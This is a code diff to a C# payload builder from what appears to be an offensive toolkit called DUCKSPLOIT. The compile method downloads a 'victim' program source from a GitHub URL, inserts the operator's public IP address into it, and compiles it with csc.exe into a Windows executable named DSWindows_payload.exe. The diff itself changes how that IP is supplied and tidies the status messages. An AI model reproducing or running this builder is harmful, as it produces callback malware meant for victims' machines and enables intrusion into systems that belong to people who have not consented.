@@ -98,7 +98,7 @@ namespace DScompiler
 				Console.ResetColor();
 			}
 		}
-		public void compile(string arch)
+		public void compile(string arch, string public_ipv4)
         {
 			string userprofile = System.Environment.GetEnvironmentVariable("USERPROFILE");
 			string tempdir = Path.GetTempPath(); 
@@ -110,29 +110,26 @@ namespace DScompiler
 					sendmsg("[o] csc.exe v3.5 is installed", "yellow");
 					Console.WriteLine(" ");
 								
-					sendmsgnonewline("Enter your ip (ipv4, ipv6 or dns server link allowed): ", "green");
-					string myip = Console.ReadLine(); 
-								
-					sendmsg("Downloading executable...", "yellow");
+					sendmsg("[~] Downloading executable...", "yellow");
 					Download("https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/victim/windows/program.cs", tempdir + "\\DSwindows.cs");
-					sendmsg("Downloaded!", "yellow");
+					sendmsg("[o] Downloaded!", "yellow");
 					
 					string text = File.ReadAllText(tempdir + "\\DSwindows.cs");
-					text = text.Replace("<yourip>", myip);
+					text = text.Replace("<yourip>", public_ipv4);
 					File.WriteAllText(tempdir + "\\DSwindows.cs", text);
 					Console.Clear();
-					sendmsg("Loading...", "yellow");
+					sendmsg("[~] Loading...", "yellow");
 								
 					execute_cmd("mkdir " + dir + "\\generated");
 					execute_cmd("call %windir%\\Microsoft.NET\\Framework\\v3.5\\csc.exe /out:" + dir + "\\generated\\DSWindows_payload.exe %temp%\\DSwindows.cs");
 					Console.Clear();
 								
-					sendmsg("DS payload is now generated! ", "yellow");
+					sendmsg("[o] DS payload is now generated! ", "yellow");
 					sendmsg("Can be found at: " + dir + "\\generated\\DSWindows_payload.exe", "yellow");
 				}
 				else
 				{
-					sendmsg("/!\\ MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload", "red");
+					sendmsg("[x] MICROSOFT.NET version v3.5 isn't installed on your computer, please install it to build windows payload", "red");
 				}
 			}
 			else if (arch == "lin")
